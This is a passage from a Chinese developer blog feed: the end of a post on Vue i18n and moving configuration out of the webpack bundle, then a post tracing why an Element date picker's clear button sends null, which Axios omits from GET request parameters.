class="attr">l</span>=<span class="string">&#123;this.$i18n&#125;</span> /&gt;</span></span>,</span><br><span class="line">  showCancelButton: <span class="literal">true</span>,</span><br><span class="line">  confirmButtonText: <span class="built_in">this</span>.$t(<span class="string">&#x27;tools.confirm&#x27;</span>),</span><br><span class="line">  cancelButtonText: <span class="built_in">this</span>.$t(<span class="string">&#x27;tools.close&#x27;</span>),</span><br><span class="line">  beforeClose: <span class="function">(<span class="params">action, instance, done</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (action === <span class="string">&#x27;confirm&#x27;</span>) &#123;</span><br><span class="line">      done()</span><br><span class="line">      confirmFn()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      done()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="组件里接收使用"><a href="#组件里接收使用" class="headerlink" title="组件里接收使用"></a>组件里接收使用</h3><p>使用 split 最好结合循环使用，这样不管多少层没事（不过这个方法还是不太好，后续想想怎么优化）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; $l(&#x27;tools.ipAddr&#x27;) &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; $l(&#x27;tools.reason&#x27;) &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">  name: <span class="string">&#x27;MsgBox&#x27;</span>,</span></span><br><span class="line">  props: &#123;</span><br><span class="line">    l: &#123;</span><br><span class="line"><span class="javascript">      <span class="keyword">default</span>: <span class="function">() =&gt;</span> &#123;&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    $l(key) &#123;</span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> i18n = <span class="built_in">this</span>.l</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> locale = i18n.locale</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> messages = i18n.messages</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> val = key.split(<span class="string">&#x27;.&#x27;</span>)</span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> messages[locale][val[<span class="number">0</span>]][val[<span class="number">1</span>]]</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="打包篇"><a href="#打包篇" class="headerlink" title="打包篇"></a>打包篇</h1><p>toB 的项目可能会有这个需求：</p><ul><li>因为页面组件和表格很多，如果有一个字段名想改，就需要重新打包，很麻烦，现在想将其提出去（比如提取到 public 文件夹下的 config.js 文件中，这个 config.js 在 index.html 中引入一下），这样以后只需要改一下这个 js 文件无需重新打包</li></ul><h3 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h3><p>首先将各个配置文件复制到 public 下面，<strong>并将其用匿名函数包裹</strong></p><p>，之后在入口 index.html 中，引入如下配置文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> now = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime();</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;script src=&quot;../config.js?t=&#x27;</span> + now + <span class="string">&#x27;&quot;&gt;&lt;\/script\&gt;&#x27;</span>)</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;script src=&quot;../lang/en.js?t=&#x27;</span> + now + <span class="string">&#x27;&quot;&gt;&lt;\/script\&gt;&#x27;</span>)</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;script src=&quot;../lang/zh.js?t=&#x27;</span> + now + <span class="string">&#x27;&quot;&gt;&lt;\/script\&gt;&#x27;</span>)</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;script src=&quot;../lang/zhTW.js?t=&#x27;</span> + now + <span class="string">&#x27;&quot;&gt;&lt;\/script\&gt;&#x27;</span>)</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>config.js 中用 var 声明变量挂载到 window 上，并在 <code>en/zh/zhTW</code> js文件中把配置加到 lang 中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> indexConfig = &#123;&#125;</span><br><span class="line">indexConfig.lang = &#123;&#125;</span><br><span class="line"><span class="comment">// zh中文-简体； en-英文； zhTW-中文繁体</span></span><br><span class="line">indexConfig.langShow = [<span class="string">&#x27;zh&#x27;</span>, <span class="string">&#x27;en&#x27;</span>, <span class="string">&#x27;zhTW&#x27;</span>]</span><br></pre></td></tr></table></figure><p>最后在各个 lang 文件下用 <code>window.indexConfig.lang</code> 获取即可</p><h3 id="打包配置"><a href="#打包配置" class="headerlink" title="打包配置"></a>打包配置</h3><p>由于打包时不会携带 lang 文件夹下面的配置文件，所以需要借助 CopyWebpackPlugin 插件进行复制</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> copyWebpackPlugins = [<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/lang&#x27;</span>].map(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> CopyWebpackPlugin([</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">from</span>: <span class="string">`./public<span class="subst">$&#123;item&#125;</span>/*`</span>,</span><br><span class="line">      to: path.resolve(__dirname, <span class="string">`dist/`</span>),</span><br><span class="line">      <span class="function"><span class="title">transformPath</span>(<span class="params">targetPath, absolutePath</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> targetPath.replace(<span class="string">`public`</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">      &#125;,</span><br><span class="line">      toType: <span class="string">&#x27;dir&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ])</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    plugins: [</span><br><span class="line">      <span class="keyword">new</span> HtmlWebpackPlugin(<span class="string">&#x27;src/index.html&#x27;</span>)</span><br><span class="line">    ].concat(copyWebpackPlugins)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样配置文件就提出去了，不过有安全风险，这个以后再说</p><h2 id="推荐参考"><a href="#推荐参考" class="headerlink" title="推荐参考"></a>推荐参考</h2><p><a href="https://segmentfault.com/a/1190000008752459">前端国际化之Vue-i18n源码分析</a></p><p><a href="https://segmentfault.com/a/1190000016445415">vue中如何使用i18n实现国际化</a></p><p><a href="https://element.eleme.cn/#/zh-CN/component/i18n">Element国际化</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;安装-i18n&quot;&gt;&lt;a href=&quot;#安装-i18n&quot; class=&quot;headerlink&quot; title=&quot;安装 i18n&quot;&gt;&lt;/a&gt;安装 i18n&lt;/h2&gt;&lt;p&gt;&lt;code&gt;internationalization&lt;/code&gt; 这个单词中，i 和 n 之间有 18 个字母&lt;/p&gt;</summary>
    
    
    
    <category term="Vue" scheme="http://llmysnow.top/categories/Vue/"/>
    
    
    <category term="Vue" scheme="http://llmysnow.top/tags/Vue/"/>
    
    <category term="Element" scheme="http://llmysnow.top/tags/Element/"/>
    
    <category term="i18n" scheme="http://llmysnow.top/tags/i18n/"/>
    
    <category term="切换语言" scheme="http://llmysnow.top/tags/%E5%88%87%E6%8D%A2%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>Element 日期选择器清除问题（Axios get请求问题）</title>
    <link href="http://llmysnow.top/posts/379f43e/"/>
    <id>http://llmysnow.top/posts/379f43e/</id>
    <published>2021-05-06T08:37:10.165Z</published>
    <updated>2021-05-26T01:20:24.487Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Element-日期选择器问题"><a href="#Element-日期选择器问题" class="headerlink" title="Element 日期选择器问题"></a>Element 日期选择器问题</h2><p>条件查询中需要根据日期进行筛选，为了用户便利性展示清除按钮</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/%E6%98%BE%E7%A4%BA%E6%B8%85%E9%99%A4%E6%8C%89%E9%92%AE.jpg"></p><ul><li>当点击清除按钮后进行查询（<strong>get 请求</strong>），报 500 了，看一下 Network，并<strong>没有进行 url 拼接</strong>（startDate 没有拼接到 url）</li><li>检查 api 文件的 params 参数，发现 params 中的 startDate 值为 null</li></ul><a id="more"></a><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/headersget%E8%AF%B7%E6%B1%82500.jpg"></p><p>到这里就出现了两个问题：</p><ol><li><strong>startDate 为什么赋值为 null 了</strong>（input 清除之后值变为空字符）</li><li>我使用的是 Axios 为什么，<strong>值为 null 没有进行 url 拼接</strong>（空字符串的就可以进行拼接）</li></ol><p>接下来先看先一下业务代码长什么样，之后就是 Axios 和 Element 源码分析</p><h3 id="vue-代码如下："><a href="#vue-代码如下：" class="headerlink" title="vue 代码如下："></a>vue 代码如下：</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-form</span> <span class="attr">ref</span>=<span class="string">&quot;queryForm&quot;</span> <span class="attr">label-width</span>=<span class="string">&quot;110px&quot;</span> <span class="attr">:model</span>=<span class="string">&quot;listQuery&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">&quot;开车日期：&quot;</span>&gt;</span></span><br><span class="line">        &lt;el-date-picker</span><br><span class="line">          v-model=&quot;listQuery.startDate&quot;</span><br><span class="line">          value-format=&quot;yyyy-MM-dd&quot;</span><br><span class="line">          type=&quot;date&quot;</span><br><span class="line">          clearable</span><br><span class="line">          placeholder=&quot;选择开车日期&quot;</span><br><span class="line">          style=&quot;width: 100%&quot;</span><br><span class="line">        /&gt;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span> <span class="attr">icon</span>=<span class="string">&quot;el-icon-search&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;getList&quot;</span></span></span><br><span class="line"><span class="tag">      &gt;</span>查 询&lt;/el-button</span><br><span class="line">    &gt;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">import</span> &#123; getStationBus &#125; <span class="keyword">from</span> <span class="string">&#x27;@/api/station-bus&#x27;</span></span></span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> &#123;</span></span><br><span class="line">        listQuery: &#123;</span><br><span class="line">          pageNumber: 1,</span><br><span class="line">          pageSize: 20,</span><br><span class="line"><span class="javascript">          startDate: <span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line">        &#125;,</span><br><span class="line">        list: [],</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">created</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.getList()</span></span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line"><span class="javascript">      <span class="function"><span class="title">getList</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">        getStationBus(<span class="built_in">this</span>.listQuery).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">          <span class="built_in">this</span>.list = res.data</span></span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="api-代码如下："><a href="#api-代码如下：" class="headerlink" title="api 代码如下："></a>api 代码如下：</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request <span class="keyword">from</span> <span class="string">&#x27;@/utils/request&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> getStationBus = <span class="function"><span class="params">params</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> request(&#123;</span><br><span class="line">    method: <span class="string">&#x27;get&#x27;</span>,</span><br><span class="line">    url: <span class="string">&#x27;/stationBus/list&#x27;</span>,</span><br><span class="line">    params,</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Axios-源码分析"><a href="#Axios-源码分析" class="headerlink" title="Axios 源码分析"></a>Axios 源码分析</h2><p><a href="https://github.com/axios/axios/blob/master/dist/axios.js">https://github.com/axios/axios/blob/master/dist/axios.js</a> 622 行左右（搜素 buildURL）</p><ul><li>当请是 get 系列请求时，如果 params 对象里面有值为 null/undefined，不会进行 url 拼接，直接 return 出去了</li></ul><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/get%E7%B3%BB%E5%88%97%E8%AF%B7%E6%B1%82.png"></p><h2 id="Element-源码分析-TimePicker组件"><a href="#Element-源码分析-TimePicker组件" class="headerlink" title="Element 源码分析[TimePicker组件]"></a>Element 源码分析[TimePicker组件]</h2><p><a href="https://github.com/ElemeFE/element/blob/dev/packages/date-picker/src/picker.vue">https://github.com/ElemeFE/element/blob/dev/packages/date-picker/src/picker.vue</a> ，搜 handleClickIcon</p><p><strong>点击清除按钮后，把值赋值为 null</strong>。这里需要注意！！！与 Input 组件不同</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/%E7%82%B9%E5%87%BB%E6%B8%85%E9%99%A4%E6%8C%89%E9%92%AE%E5%90%8E%E8%B5%8B%E5%80%BC%E4%B8%BAnull%E6%97%A5%E6%9C%9F%E7%BB%84%E4%BB%B6.jpg"></p><h2 id="Element-源码分析-Input组件"><a href="#Element-源码分析-Input组件" class="headerlink" title="Element 源码分析[Input组件]"></a>Element 源码分析[Input组件]</h2><p><a href="https://github.com/ElemeFE/element/blob/dev/packages/input/src/input.vue">https://github.com/ElemeFE/element/blob/dev/packages/input/src/input.vue</a>，搜 clear</p><p><strong>点击清除按钮后，把值赋值为 空字符串</strong></p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/%E7%82%B9%E5%87%BB%E6%B8%85%E9%99%A4%E6%8C%89%E9%92%AE%E5%90%8E%E8%B5%8B%E5%80%BC%E4%B8%BAnull%E8%BE%93%E5%85%A5%E6%A1%86%E7%BB%84%E4%BB%B6.jpg"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Element-日期选择器问题&quot;&gt;&lt;a href=&quot;#Element-日期选择器问题&quot; class=&quot;headerlink&quot; title=&quot;Element 日期选择器问题&quot;&gt;&lt;/a&gt;Element 日期选择器问题&lt;/h2&gt;&lt;p&gt;条件查询中需要根据日期进行筛选，为了用户便利性展示清除按钮&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&quot;https://gitee.com/lilyn/pic/raw/master/company-img/%E6%98%BE%E7%A4%BA%E6%B8%85%E9%99%A4%E6%8C%89%E9%92%AE.jpg&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当点击清除按钮后进行查询（&lt;strong&gt;get 请求&lt;/strong&gt;），报 500 了，看一下 Network，并&lt;strong&gt;没有进行 url 拼接&lt;/strong&gt;（startDate 没有拼接到 url）&lt;/li&gt;
&lt;li&gt;检查 api 文件的 params 参数，发现 params 中的 startDate 值为 null&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Vue" scheme="http://llmysnow.top/categories/Vue/"/>
    
    
    <category term="Vue" scheme="http://llmysnow.top/tags/Vue/"/>
    
    <category term="Axios" scheme="http://llmysnow.top/tags/Axios/"/>
    
    <category term="Element" scheme="http://llmysnow.top/tags/Element/"/>
    
    <category term="源码分析" scheme="http://llmysnow.top/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
    <category term="问题" scheme="http://llmysnow.top/tags/%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
</feed>
